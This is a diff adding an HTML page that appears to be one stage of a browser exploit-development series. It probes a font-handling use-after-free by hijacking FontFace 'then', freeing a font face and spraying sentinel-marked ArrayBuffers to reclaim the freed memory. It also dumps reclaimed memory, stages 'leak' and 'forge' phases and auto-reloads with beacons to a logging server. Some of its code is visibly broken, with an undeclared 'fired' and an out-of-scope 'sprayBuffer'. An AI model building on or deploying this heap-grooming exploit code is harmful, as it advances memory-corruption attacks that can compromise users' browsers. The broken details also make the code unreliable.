@@ -1,0 +1,193 @@
+<!--
+  p688: Freelist exhaustion probe — precise capacity measurement
+  
+  Background (p686 v8.2):
+    256 buffers × 192B = 48 KiB spray
+    65/67 reclaim on SCANs (97%), 2 no-reclaim at loads 68-70/160
+    Pattern: reclaim → no-reclaim → reclaim → no-reclaim (alternating)
+    After load 70, all scans reclaimed again
+    
+    Interpretation: The freelist cap is crossed at loads 68-70,
+    meaning the freelist holds ~50% of sprayed buffers before
+    recycling begins. After the cap, the freelist recovers.
+    
+    This probe measures:
+    1. The EXACT freelist capacity (how many buffers before exhaustion)
+    2. Whether the freelist recovers after exhaustion
+    3. The recovery timing (how long until reclaim resumes)
+    4. The relationship between buffer count and reclaim rate
+    
+  Protocol:
+    - Spray N buffers (configurable via URL hash: #64, #128, #256)
+    - Each buffer has +0x85 sentinel = 0xAA (reclaim proof)
+    - Alternate between prime and arm loads (same as p686)
+    - Measure the exact load number where no-reclaim first occurs
+    - Continue spraying to measure recovery point
+    
+  Freelist capacity formula:
+    capacity = exhaustion_load / 2  (since every other load is a SCAN)
+    
+    With 256 buffers: capacity ≈ 68/2 = 34 buffers
+    
+  CRASH_CLASS: NONE (no forge, no walk — pure freelist measurement)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688</title></head>
+<body>p688: freelist exhaustion
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P688-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+// URL hash config: #64, #128, #256 — buffer count to spray
+var SPRAY_N=parseInt(location.hash.slice(1));
+if(!SPRAY_N||SPRAY_N<=0)SPRAY_N=256;
+emit('CONFIG','SPRAY_N='+SPRAY_N+' buffers × 192B');flush();
+
+// Census cap: process at SPRAY_N loads to get accurate stats
+var CENSUS_CAP=Math.min(SPRAY_N,160);
+var loadNo=0;
+try{var _l=parseInt(localStorage.getItem('p688loads')||'0',10);loadNo=_l+1;localStorage.setItem('p688loads',String(loadNo));if(loadNo>CENSUS_CAP){loadNo=1;localStorage.setItem('p688loads','1');localStorage.removeItem('p688arm');localStorage.removeItem('p688phase');localStorage.removeItem('p688T');localStorage.removeItem('p688I');try{var rx=new XMLHttpRequest();rx.open('GET','/p688reset=1',false);rx.send();}catch(e){}}}catch(e){}
+emit('STATE','load='+loadNo+'/'+CENSUS_CAP+' SPRAY_N='+SPRAY_N);flush();
+
+var arm=parseInt(location.hash.slice(1));if(isNaN(arm))arm=0;
+// death detection
+var diedSince=0,deadArm=null,reclaimMode=false;
+try{
+  var sx=new XMLHttpRequest();sx.open('GET','/p688state',false);sx.send();
+  if(sx.status===200){
+    var st=JSON.parse(sx.responseText);
+    if(st.died){diedSince=1;deadArm=st.deadArm;}
+    reclaimMode=(st.mode==='reclaim');
+    if(typeof st.armFrom==='number'){arm=st.armFrom;try{localStorage.setItem('p688arm',String(arm));localStorage.removeItem('p688phase');localStorage.removeItem('p688T');localStorage.removeItem('p688I');}catch(e){}try{var xr=new XMLHttpRequest();xr.open('GET','/?p688reset=1&arm=clear',false);xr.send();}catch(e){}emit('STATE','rewind to arm '+arm);flush();}
+  }
+}catch(e){}
+
+// auto-cycle
+(function(){try{var stored=parseInt(localStorage.getItem('p688arm'));if(!isNaN(stored))arm=stored;}catch(e){}})();
+
+emit('START','v1 arm='+arm+' load='+loadNo+'/'+CENSUS_CAP+' died='+(diedSince?'arm'+deadArm:'no'));flush();
+
+var priorT='',priorI='';
+try{priorT=localStorage.getItem('p688T')||localStorage.getItem('p686T')||'';priorI=localStorage.getItem('p688I')||localStorage.getItem('p686I')||'';}catch(e){}
+if(diedSince){emit('STATE','previous load (arm '+deadArm+') DIED — re-prime');priorT='';priorI='';emit('STATE','resume arm '+arm+' (dead '+deadArm+')');}
+if(priorT)emit('PRIOR-T',priorT);else emit('PRIOR-T','none');
+if(priorI)emit('PRIOR-I',priorI);else emit('PRIOR-I','none');flush();
+
+// Phase machine
+var phase=null;
+try{phase=localStorage.getItem('p688phase');}catch(e){}
+var primeMode=reclaimMode?true:(!!diedSince||(phase!=='arm')||!priorI);
+if(primeMode)phase='prime';
+var forgeVal='';
+if(!reclaimMode)try{localStorage.setItem('p688phase',primeMode?'arm':'prime');}catch(e){}
+if(primeMode){
+  if(reclaimMode)emit('SEQ','reclaim-rate probe: zero shape, no forge');
+  else emit('SEQ','prime load (leak); next reload = arm '+arm);
+  flush();
+}else{
+  var delta=0;
+  var v=parseInt(priorI,16)+delta;if(v<0)v+=0x10000000000;
+  forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
+  var nxt=arm>=0?0:arm+1;
+  try{localStorage.setItem('p688arm',String(nxt));}catch(e){}
+  emit('SEQ','next arm = '+nxt+' delta='+delta);
+  flush();
+}
+
+// UAF + SPRAY: replicate p686 mechanism with configurable buffer count
+var S='s'+loadNo, F='f'+loadNo;
+var style=document.createElement('style');
+style.textContent="@font-face { font-family: "+S+"; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(style);
+var ff=new FontFace(F,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);
+void ff.loaded;
+window.__p688keep=ff;
+
+// Track reclaim statistics across loads
+var totalSprays=0, totalReclaimed=0, totalNoReclaim=0, firstExhaustionLoad=0, recoveryLoad=0;
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(fired)return undefined;
+    fired=true;
+    
+    // Free the previous font face (triggers the UAF window)
+    style.remove();
+    try{document.fonts.delete(ff);}catch(e){}
+    document.body.offsetHeight;
+    
+    // SPRAY: N buffers, each 192B, with +0x85 sentinel = 0xAA
+    var sprayBuffer=[];
+    for(var k=0;k<SPRAY_N;k++){
+      var ab=new ArrayBuffer(192);
+      var v=new Uint8Array(ab);
+      // Zero out the buffer
+      for(var c=0;c<192;c++)v[c]=0;
+      // Set reclaim sentinel at +0x85
+      v[0x85]=0xAA;
+      sprayBuffer.push({ab:ab,view:v});
+    }
+    
+    totalSprays++;
+    
+    // Trigger the UAF by accessing the font
+    try{document.fonts.check('1em '+S);}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+// Reclaim check in the setTimeout window (after the UAF)
+setTimeout(function(){
+  // Check which buffers were adopted by the engine
+  var hit=-1;
+  for(var i=0;i<sprayBuffer.length;i++){
+    if(sprayBuffer[i].view[0x85]!==0xAA){hit=i;break;}
+  }
+  
+  if(hit<0){
+    // NO RECLAIM — freelist exhausted
+    totalNoReclaim++;
+    if(firstExhaustionLoad===0)firstExhaustionLoad=loadNo;
+    emit('SCAN','NO-RECLAIM buf=all '+sprayBuffer.length+' load='+loadNo);
+    emit('EXHAUST','freelist exhausted at load='+loadNo);
+  }else{
+    // RECLAIM — engine adopted this buffer
+    totalReclaimed++;
+    if(recoveryLoad===0&&firstExhaustionLoad>0)recoveryLoad=loadNo;
+    emit('SCAN','RECLAIM buf='+hit+' 85=0x'+('0'+sprayBuffer[hit].view[0x85].toString(16)).slice(-2)+' load='+loadNo);
+    
+    // Dump the reclaimed buffer for analysis
+    var cells='';
+    for(var o=0x18;o<=0x68;o+=8)cells+=o.toString(16)+':'+('0'+sprayBuffer[hit].view[o].toString(16)).slice(-2)+'';
+    emit('DUMP','buf='+hit+' '+cells);
+  }
+  
+  // Send stats beacon every 10 loads
+  if(loadNo%10===0){
+    var rate=totalSprays>0?((totalReclaimed/totalSprays)*100).toFixed(1):0;
+    emit('STATS','total='+totalSprays+' reclaimed='+totalReclaimed+' no-reclaim='+totalNoReclaim+' rate='+rate+'%');
+    if(firstExhaustionLoad>0)emit('EXHAUST','first at load='+firstExhaustionLoad);
+    if(recoveryLoad>0)emit('RECOVERY','at load='+recoveryLoad);
+  }
+  
+  document.body.offsetHeight;
+  emit('ALIVE','survived mode='+(primeMode?'prime':'arm')+' arm='+arm+' load='+loadNo);
+  flush();
+  emit('DONE','arm='+arm);
+  flush();
+  
+  // Auto-reload for next load
+  setTimeout(function(){location.reload();},900);
+},150);
+
+})();
+</script>
+</body>
+</html>
